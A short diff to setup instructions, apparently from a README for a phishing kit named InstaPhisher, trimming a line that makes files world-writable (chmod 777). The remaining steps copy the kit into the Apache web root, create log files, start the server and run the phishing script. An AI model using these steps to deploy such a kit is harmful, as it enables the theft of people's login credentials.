@@ -36,7 +36,7 @@ cd InstaPhisher
 cp * -r '/var/www/html'
 cd /var/www/html
 touch logs.txt && touch serverMsg.txt
-sudo chmod 777 login.php && sudo chmod 777 InstaPhisher.py && chmod 777 logs.txt && chmod 777 serverMsg.txt
+sudo chmod 777 logs.txt && chmod 777 serverMsg.txt
 service apache2 start
 python InstaPhisher.py
 ```
